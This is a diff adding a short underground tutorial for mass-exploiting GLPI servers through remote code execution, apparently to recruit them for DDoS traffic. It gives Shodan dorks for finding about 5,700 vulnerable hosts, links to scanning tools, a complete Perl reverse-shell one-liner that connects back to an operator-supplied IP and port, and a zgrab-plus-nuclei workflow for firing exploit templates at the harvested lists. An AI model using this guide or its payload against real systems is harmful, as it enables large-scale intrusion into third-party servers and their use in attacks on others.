@@ -1,0 +1,39 @@
+x86 GLPI RCE Exploit tut
+
+Found by:https://t.me/devddos
+
+
+
+5.7k Shodan
+5.7k Vulnerable
+
+Output per device 300 - 1024 MB
+-----------Dorks------------
+https://www.shodan.io/search?query=http.title%3A"GLPI"
+http.title:"GLPI"
+----------------------------
+
+Github links:
+
+https://github.com/projectdiscovery/nuclei-templates
+https://github.com/restran/shellcat/releases/tag/1.0 - download on rdp
+https://github.com/zmap/zgrab2 
+https://www.youtube.com/watch?v=6FDKHewTP4A - nuclei exmaple if you dont how to use it
+
+What you need:
+Windows 2012 RDP Server
+Perl payload CLI to connect VIA Reverse shell definded in the yml file
+EG:
+perl -e 'use Socket;$i="SHELLIP";$p=SHELLPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+Encode with HTTP Code^
+
+
+Nuclei
+
+How to use:
+Make lists off shodan using the dorks, load with nuclei i will send u some templates but u will needa do some research for this
+zgrab the port and load with nuclei eg: zgrab -w list -p 8080: nuclei -l target_urls.txt -t cve.yml 
+
+
+
+Warning: Requires 4gb+ ram as they ALL connect straigt away
